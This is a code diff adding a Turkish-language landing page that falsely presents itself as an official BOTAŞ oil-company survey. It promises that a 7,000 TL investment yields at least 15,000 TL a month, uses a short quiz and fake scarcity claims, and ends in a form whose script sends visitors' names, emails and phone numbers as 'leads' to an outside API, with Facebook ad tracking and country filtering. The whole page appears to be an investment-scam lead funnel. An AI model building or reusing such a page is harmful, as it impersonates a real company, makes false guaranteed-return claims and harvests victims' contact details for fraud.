@@ -1,0 +1,570 @@
+
+
+<!DOCTYPE html>
+<html lang="tr-TR">
+    <head>
+        <meta name="facebook-domain-verification" content="{{fb_domain_verification}}" />
+        <meta name="robots" content="noindex, nofollow" />
+
+        <meta http-equiv="Content-Type" content="text/html;charset=UTF-8" />
+        <meta name="google" content="notranslate">
+        <meta name="description" content="Resmi anket" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+		<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0" />
+
+        <title>Resmi anket</title>
+        
+        <link rel="icon" type="image/x-icon" href="./favicon.ico" />
+        
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.2.2/css/bootstrap.min.css">
+        
+        <link rel="stylesheet" href="./css/style.css"/>
+        <link rel="stylesheet" href="./css/test.css"/>
+        <link rel="stylesheet" href="./css/parallax.css"/>
+        <link rel="stylesheet" href="./css/form.css">
+
+        <!-- Facebook Pixel Code -->
+        <script>
+            function parseURLParams(url) {
+                var queryString = url ? url.split("?")[1] : window.location.search.slice(1);
+                var obj = {};
+
+                if (queryString) {
+                    queryString = queryString.split("#")[0];
+                    var arr = queryString.split("&");
+
+                    for (var i = 0; i < arr.length; i++) {
+                        var a = arr[i].split("=");
+                        var paramName = a[0];
+                        var paramValue = typeof a[1] === "undefined" ? true : a[1];
+
+                        if (paramName.match(/\[(\d+)?\]$/)) {
+                            var key = paramName.replace(/\[(\d+)?\]/, "");
+                            if (!obj[key]) obj[key] = [];
+
+                            if (paramName.match(/\[\d+\]$/)) {
+                                var index = /\[(\d+)\]/.exec(paramName)[1];
+                                obj[key][index] = paramValue;
+                            } else {
+                                obj[key].push(paramValue);
+                            }
+                        } else {
+                            if (!obj[paramName]) {
+                                obj[paramName] = paramValue;
+                            } else if (obj[paramName] && typeof obj[paramName] === "string") {
+                                obj[paramName] = [obj[paramName]];
+                                obj[paramName].push(paramValue);
+                            } else {
+                                obj[paramName].push(paramValue);
+                            }
+                        }
+                    }
+                }
+
+                return obj;
+            }
+
+            const { fbpixel, fbclid, app_id } = parseURLParams(location.href);
+
+            !(function (f, b, e, v, n, t, s) {
+                if (f.fbq) return;
+                n = f.fbq = function () {
+                    n.callMethod ? n.callMethod.apply(n, arguments) : n.queue.push(arguments);
+                };
+                if (!f._fbq) f._fbq = n;
+                n.push = n;
+                n.loaded = !0;
+                n.version = "2.0";
+                n.queue = [];
+                t = b.createElement(e);
+                t.async = !0;
+                t.src = v;
+                s = b.getElementsByTagName(e)[0];
+                s.parentNode.insertBefore(t, s);
+            })(window, document, "script", "https://connect.facebook.net/en_US/fbevents.js");
+            fbq("init", `"${fbpixel}"`);
+            fbq("track", "PageView");
+        </script>
+        <noscript>
+            <img height="1" width="1" style="display: none;" src="https://www.facebook.com/tr?id=fbpixel&ev=PageView&noscript=1" />
+        </noscript>
+        <!-- End Facebook Pixel Code -->
+    </head>
+
+    <body class="notranslate">
+        <div class="main-content">
+            <div class="loader">
+                <div class="loader-element"></div>
+            </div>
+            <div class="main-left">
+                <div class="main-left-icons-holder">
+                    <img class="main-left-img" src="images/main-left-img.jpg" alt="main-left-img" />
+                </div>
+            </div>
+
+            <div class="main-right">
+                <section class="main">
+                    <img class="main__logo" src="images/logo.webp" alt="" />
+
+                    <div class="main-line"></div>
+
+                    <h1 class="main__title">BOTAŞ PETROL ŞİRKETİNİN RESMİ ANKETİNİ YAPIN VE<span class="text--orange"> PLATFORMA ERİŞİN!</span></h1>
+
+                    <p>
+                        7000 TL YATIRIM YAPIN VE EN BÜYÜK PETROL ŞİRKETİNDE 15000 TL'DEN PARA KAZANMAYA BAŞLAYIN
+
+                        <br />
+                        <br />
+                        Botaş'tan yeni bir yatırım projesi. Hayatınızı iyileştirmeyi garanti eden özel bir proje. Bizimle birlikte her Türk vatandaşı refah içinde yaşayacak!
+                    </p>
+
+                    <button type="button" class="btn main__button" data-bs-toggle="modal" data-bs-target="#exampleModal">
+                        <svg class="main__button-icon" xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 18 18" fill="none">
+                            <path
+                                d="M15 9.5C15 12.815 12.315 15.5 9 15.5C5.685 15.5 3 12.815 3 9.5C3 6.185 5.685 3.5 9 3.5C9.57 3.5 10.125 3.5825 10.65 3.7325L11.8275 2.555C10.9575 2.195 10.005 2 9 2C4.86 2 1.5 5.36 1.5 9.5C1.5 13.64 4.86 17 9 17C13.14 17 16.5 13.64 16.5 9.5M5.9325 8.06L4.875 9.125L8.25 12.5L15.75 5L14.6925 3.935L8.25 10.3775L5.9325 8.06Z"
+                                fill="black"
+                            ></path>
+                        </svg>
+                        Anketi geçmek
+                    </button>
+                </section>
+            </div>
+        </div>
+    
+        <div class="modal fade" id="exampleModal" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
+            <div class="modal-dialog modal-xl modal-dialog-centered">
+                <div class="modal-content">
+                    <div class="modal-body p-0">
+                        <div class="test">
+                            <section id="qquestion1" class="question1">
+                                <div class="question-side">
+                                    <div class="radio-form">
+                                        <div class="question-side__answers-area">   
+                                            <ul class="radio-list radio-list1 active">
+                                                <h2 class="question-side__question-title">
+                                                    1. En büyük devlet petrol şirketinin "BOTAŞ" yatırım platformuna finansman sağladığını ve şu anda Türk vatandaşlarına sunulduğunu biliyor muydunuz?
+                                                </h2>
+                                                <div class="questionPartpart">
+                                                    <div class="questionSide">
+                                                        <li class="radio-list_item">
+                                                            <input class="radio-answer" data-exception="" data-question="" data-answer="" type="radio" name="group0" id="q0" value="Evet, biliyorum" />
+                                                            <label for="q0" onclick="press_btn_(this)">Evet, biliyorum</label>
+                                                        </li>
+                                                        <li class="radio-list_item">
+                                                            <input class="radio-answer" data-exception="" data-question="" data-answer="" type="radio" name="group0" id="q1" value="Hayır, bilmiyorum" />
+                                                            <label for="q1" onclick="press_btn_(this)">Hayır, bilmiyorum</label>
+                                                        </li>
+                                                    </div>
+
+                                                    <div class="questionPicSide">
+                                                        <img src="images/1.jpg" alt="" class="img-fluid" />
+                                                    </div>
+                                                </div>
+                                                <div class="line">
+                                                    <div class="line__title">Soru 4'te 1'dir.</div>
+                                                    <div class="parts">
+                                                        <div class="part action"></div>
+                                                        <div class="part"></div>
+                                                        <div class="part"></div>
+                                                        <div class="part"></div>
+                                                    </div>
+                                                </div>
+                                            </ul>
+                                            <ul class="radio-list radio-list2">
+                                                <h2 class="question-side__question-title">2. Yatırım yapma konusunda tecrübeniz var mı?</h2>
+                                                <div class="questionPartpart">
+                                                    <div class="questionSide">
+                                                        <li class="radio-list_item">
+                                                            <input
+                                                                class="radio-answer"
+                                                                data-exception=""
+                                                                data-question=""
+                                                                data-answer=""
+                                                                type="radio"
+                                                                name="group1"
+                                                                id="q2"
+                                                                value="Evet, bugüne kadar başarılı bir şekilde yatırım yapıyorum"
+                                                            />
+                                                            <label for="q2" onclick="press_btn_(this)">Evet, bugüne kadar başarılı bir şekilde yatırım yapıyorum</label>
+                                                        </li>
+
+                                                        <li class="radio-list_item">
+                                                            <input class="radio-answer" data-exception="" data-question="" data-answer="" type="radio" name="group1" id="q3" value="Daha önce yatırım yaptım" />
+                                                            <label for="q3" onclick="press_btn_(this)">Daha önce yatırım yaptım</label>
+                                                        </li>
+                                                        <li class="radio-list_item">
+                                                            <input class="radio-answer" data-exception="" data-question="" data-answer="" type="radio" name="group1" id="q4" value="Hayır, daha önce hiç yatırım yapmadım" />
+                                                            <label for="q4" onclick="press_btn_(this)">Hayır, daha önce hiç yatırım yapmadım </label>
+                                                        </li>
+                                                    </div>
+
+                                                    <div class="questionPicSide">
+                                                        <img src="images/2.jpg" alt="" class="img-fluid" />
+                                                    </div>
+                                                </div>
+                                                <div class="line">
+                                                    <div class="line__title">Soru 4'te 2'dir.</div>
+                                                    <div class="parts">
+                                                        <div class="part action"></div>
+                                                        <div class="part action"></div>
+                                                        <div class="part"></div>
+                                                        <div class="part"></div>
+                                                    </div>
+                                                </div>
+                                            </ul>
+
+                                            <ul class="radio-list radio-list3">
+                                                <h2 class="question-side__question-title">3. Yatırım platformundaki ortalama gelir ayda 15.000 liradır. Ayda ne kadar kazanmak istiyorsunuz?</h2>
+                                                <div class="questionPartpart">
+                                                    <div class="questionSide">
+                                                        <li class="radio-list_item">
+                                                            <input class="radio-answer" data-exception="" data-question="" data-answer="" type="radio" name="group2" id="q5" value="15.000 lira" />
+                                                            <label for="q5" onclick="press_btn_(this)">15.000 lira</label>
+                                                        </li>
+                                                        <li class="radio-list_item">
+                                                            <input class="radio-answer" data-exception="" data-question="" data-answer="" type="radio" name="group2" id="q6" value="30.000 lira" />
+                                                            <label for="q6" onclick="press_btn_(this)">30.000 lira</label>
+                                                        </li>
+                                                        <li class="radio-list_item">
+                                                            <input class="radio-answer" data-exception="" data-question="" data-answer="" type="radio" name="group2" id="q7" value="50.000 lira" />
+                                                            <label for="q7" onclick="press_btn_(this)">50.000 lira</label>
+                                                        </li>
+                                                    </div>
+
+                                                    <div class="questionPicSide">
+                                                        <img src="images/3.jpg" alt="" class="img-fluid" />
+                                                    </div>
+                                                </div>
+                                                <div class="line">
+                                                    <div class="line__title">Soru 4'te 3'dir.</div>
+                                                    <div class="parts">
+                                                        <div class="part action"></div>
+                                                        <div class="part action"></div>
+                                                        <div class="part action"></div>
+                                                        <div class="part"></div>
+                                                    </div>
+                                                </div>
+                                            </ul>
+
+                                            <ul class="radio-list radio-list4">
+                                                <h2 class="question-side__question-title">4. Platformda kazanılan fonları nasıl elden çıkarmayı planlıyorsunuz?</h2>
+                                                <div class="questionPartpart">
+                                                    <div class="questionSide">
+                                                        <li class="radio-list_item">
+                                                            <input class="radio-answer" data-exception="" data-question="" data-answer="" type="radio" name="group3" id="q8" value="Bir araba veya mülk satın alın" />
+                                                            <label for="q8" onclick="press_btn_(this)">Bir araba veya mülk satın alın</label>
+                                                        </li>
+                                                        <li class="radio-list_item">
+                                                            <input class="radio-answer" data-exception="" data-question="" data-answer="" type="radio" name="group3" id="q9" value="Paranın çoğalması için daha fazla yatırım yapacağım" />
+                                                            <label for="q9" onclick="press_btn_(this)">Paranın çoğalması için daha fazla yatırım yapacağım</label>
+                                                        </li>
+                                                        <li class="radio-list_item">
+                                                            <input class="radio-answer" data-exception="" data-question="" data-answer="" type="radio" name="group3" id="q10" value="Henüz bilmiyorum" />
+                                                            <label for="q10" onclick="press_btn_(this)">Henüz bilmiyorum</label>
+                                                        </li>
+                                                    </div>
+
+                                                    <div class="questionPicSide">
+                                                        <img src="images/4.webp" alt="" class="img-fluid" />
+                                                    </div>
+                                                </div>
+                                                <div class="line">
+                                                    <div class="line__title">Soru 4'te 4'dir.</div>
+                                                    <div class="parts">
+                                                        <div class="part action"></div>
+                                                        <div class="part action"></div>
+                                                        <div class="part action"></div>
+                                                        <div class="part action"></div>
+                                                    </div>
+                                                </div>
+                                            </ul>
+
+                                            <div class="radio-list radio-list10">
+                                                <div class="form__wrapper text-center">
+                                                    <div class="row justify-content-between">
+                                                        <div class="col-xl-6 formLeftSide">
+                                                            <div style="display: flex; align-items: center; gap: 30px; margin-bottom: 20px;">
+                                                                <img src="images/logo.webp" alt="" />
+                                                            </div>
+                                                            <h3 class="form__title gold pt-20">
+                                                                İletişim bilgilerinizi bırakın ve şimdi kazanmaya başlayın.
+                                                            </h3>
+                                                            <h5 class="form__subtitle pt-20">
+                                                                Koltuk sayısı sınırlıdır, erişin bugün kapalı olacaktır!
+                                                            </h5>
+                                                        </div>
+                                                        <div class="col-xl-5">
+                                                            <form class="register-form" id="reg_form" name="reg_form">
+                                                                <div class="form-input-main">
+                                                                    <input type="text" class="form-input" name="first_name" placeholder="Ad" required />
+                                                                </div>
+                                                    
+                                                                <div class="form-input-main">
+                                                                    <input type="text" class="form-input" name="last_name" placeholder="Soyad" required />
+                                                                </div>
+                                                    
+                                                                <div class="form-input-main">
+                                                                    <input name="email" placeholder="E-mail" required type="email" />
+                                                                </div>
+                                                    
+                                                                <div class="form-input-main">
+                                                                    <input type="hidden" name="phonePrefix" value="44" /> 
+                                                                    <input type="tel" class="form-input" name="phone" placeholder="Telefon" required />
+                                                                </div>
+                                                    
+                                                                <button name="submitBtn" type="submit">Kayıt olmak</button>
+                                                            </form>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+
+                                <div class="question-side__vip">
+                                    <div class="question-side__button-wrap">
+                                        <button class="question-side__button next-button" style="display: none;"></button>
+                                    </div>
+                                </div>
+                            </section>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.1/jquery.min.js"></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.2.2/js/bootstrap.bundle.min.js"></script>
+        
+		<!-- intlTelInput -->
+		<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/18.5.0/css/intlTelInput.css" />
+		<script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/18.5.0/js/intlTelInput.min.js"></script>
+
+        <div id="modal_phone" class="modal_phone fade_phone" tabindex="-1">
+			<div class="modal-dialog_phone">
+				<div class="modal-content_phone">
+					<div class="modal-header_phone">
+						<h5 class="modal-title_phone">
+							Teléfono no válido
+						</h5>
+						<button type="button" class="close-button_phone" id="close-button_phone">×</button>
+					</div>
+					<div class="modal-body_phone">
+						¡Perdona! El programa no es compatible con su región. Introduzca su número de socio europeo
+					</div>
+				</div>
+			</div>
+		</div>
+
+        <script src="./js/main.js"></script>
+
+		<script>
+            const openModal = () => {
+                document.getElementById("modal_phone").classList.add("open_phone");
+                document.body.classList.add("modal-open_phone");
+            };
+
+            const closeModal = () => {
+                document.getElementById("modal_phone").classList.remove("open_phone");
+                document.body.classList.remove("modal-open_phone");
+            };
+
+            document.getElementById("close-button_phone").addEventListener("click", closeModal);
+
+            $(document).ready(function () {
+                let phonePrefix = "44";
+
+                $.ajax({
+                    url: "https://getyourapi.site/api/geolocation",
+                    dataType: "json",
+                    success: function (result) {
+                        $('input[name="phone"]').each(function (input) {
+                            let iti = intlTelInput(this, {
+                                ...result.data,
+                                autoHideDialCode: "true",
+                                customContainer: "phoneWrapper",
+                                autoPlaceholder: "aggressive",
+                                separateDialCode: "false",
+								utilsScript: "https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/18.5.0/js/utils.min.js",
+                            });
+                            phonePrefix = iti.getSelectedCountryData().dialCode;
+                            $(this).on("countrychange", function () {
+                                phonePrefix = iti.getSelectedCountryData().dialCode;
+                            });
+                            return iti;
+                        });
+                    },
+                });
+
+                function validateEmail(email) {
+                    return /[a-z0-9!#$%&'*+/=?^_`{|}~-]+(?:\.[a-z0-9!#$%&'*+/=?^_`{|}~-]+)*@(?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\.)+[a-z0-9](?:[a-z0-9-]*[a-z0-9])?/.test(String(email).toLowerCase());
+                }
+
+                function changInputHandler(e) {
+                    if (e.target.value.length === 0) {
+                        this.classList.remove("valid");
+                        this.classList.add("error");
+                        return;
+                    }
+                    this.classList.add("valid");
+                    this.classList.remove("error");
+                }
+                function changEmailHandler(e) {
+                    if (validateEmail(e.target.value) === false) {
+                        this.classList.add("error");
+                        this.classList.remove("valid");
+                        return;
+                    }
+                    this.classList.add("valid");
+                    this.classList.remove("error");
+                }
+
+                $(".form-input").keyup(changInputHandler);
+                $(".form-input").change(changInputHandler);
+                $("input[name = email]").keyup(changEmailHandler);
+                $("input[name = email]").change(function (e) {});
+
+                $("form.register-form").submit(function (e) {
+                    e.preventDefault();
+
+                    $(".loader").css("display", "block");
+                    const button = $("button[name=submitBtn]");
+                    button.prop("disabled", true);
+                    const form = $(this);
+
+                    const first_name = form.find("input[name = first_name]");
+                    const last_name = form.find("input[name = last_name]");
+                    const email = form.find("input[name = email]");
+                    const phone = form.find("input[name = phone]");
+
+                    let isError = false;
+					if (first_name.val() === "" || first_name.val().match(/[0-9]/) || first_name.val().trim() === "") {
+                        first_name.addClass("error").removeClass('valid').val("").attr("placeholder", "Enter your name");
+                        isError = true;
+                    }
+
+					if (last_name.val() === "" || last_name.val().match(/[0-9]/) || last_name.val().trim() === "") {
+                        last_name.addClass("error").removeClass('valid').val("").attr("placeholder", "Enter your last name");
+                        isError = true;
+                    }
+
+                    if (phone.val() === "" || phone.val().trim() === "" || isNaN(phone.val())) {
+                        phone.addClass("error").removeClass('valid').val("").attr("placeholder", "Enter your phone number");
+                        isError = true;
+                    }
+
+                    if (validateEmail(email.val()) === false) {
+                        email.addClass("error").val("").attr("placeholder", "You entered an incorrect email address");
+                        isError = true;
+                    }
+
+                    if (isError === true) {
+                        button.prop("disabled", false);
+                        $(".loader").css("display", "none");
+                        return;
+                    }
+
+                    const checkNumber = new Promise((resolve, reject) => {
+                        $.ajax({
+                            url: "https://getyourapi.site/api/phone/validate",
+                            type: "post",
+                            contentType: "application/json",
+                            data: JSON.stringify({
+                                phone: `${phonePrefix}${phone.val()}`,
+                            }),
+                            success: resolve,
+                            error: reject,
+                        });
+                    });
+                    const getBlacklist = new Promise(function (resolve, reject) {
+                        $.ajax({
+                            url: "https://getyourapi.site/api/blacklist",
+                            type: "get",
+                            contentType: "application/json",
+                            success: resolve,
+                            error: reject,
+                        });
+                    });
+
+                    Promise.all([checkNumber, getBlacklist])
+                        .then(([checkNumber, blacklist]) => {
+                            if (checkNumber.status === false) {
+                                button.prop("disabled", false);
+                                $(".loader").css("display", "none");
+                                phone.addClass("error").removeClass("valid").val("").attr("placeholder", "The phone number is incorrect");
+                                return false;
+                            }
+
+                            if (blacklist.status === false) {
+                                button.prop("disabled", false);
+                                $(".loader").css("display", "none");
+                                return false;
+                            }
+
+                            if (blacklist.data.blacklist.includes(checkNumber.data.country_code.toLowerCase())) {
+                                button.prop("disabled", false);
+                                $(".loader").css("display", "none");
+                                openModal();
+                                setTimeout(closeModal, 5000);
+
+                                return false;
+                            }
+
+                            $.ajax({
+                                url: "https://getyourapi.site/api/leads/app",
+                                type: "post",
+                                contentType: "application/json",
+                                data: JSON.stringify({
+                                    first_name: first_name.val(),
+                                    last_name: last_name.val(),
+                                    email: email.val(),
+                                    phone: phone.val(),
+                                    country: checkNumber.data.country_code,
+                                    app_id: app_id,
+                                    click_id: fbclid,
+                                }),
+                                dataType: "json",
+                                success: function (res) {
+                                    if (res.status === true) {
+                                        fbq("track", "Lead");
+                                        fbq("track", "CompleteRegistration");
+                                        switch (res.data.proceedWith) {
+                                            case "success":
+                                                window.location.href = "./success.html" ;
+                                                break;
+                                            case "exist":
+                                                window.location.href = "./error.html" ;
+                                                break;
+                                            case "redirect":
+                                                window.location.href = res.data.redirectUrl;
+                                                break;
+                                            default:
+                                                window.location.href = "./success.html" ;
+                                        }
+                                        console.log("click");
+                                    } else {
+                                        alert("Error! Please try again.");
+                                        $(".loader").css("display", "none");
+                                        button.prop("disabled", false);
+                                    }
+                                },
+                                error: function (error) {
+                                    button.prop("disabled", false);
+                                    $(".loader").css("display", "none");
+                                    console.error(error);
+                                },
+                            });
+                        })
+                        .catch(function (error) {
+                            button.prop("disabled", false);
+                            $(".loader").css("display", "none");
+                            console.error(error);
+                        });
+                });
+            });
+        </script>
+
+        <script src="./js/modal.js"></script>
+    </body>
+</html>
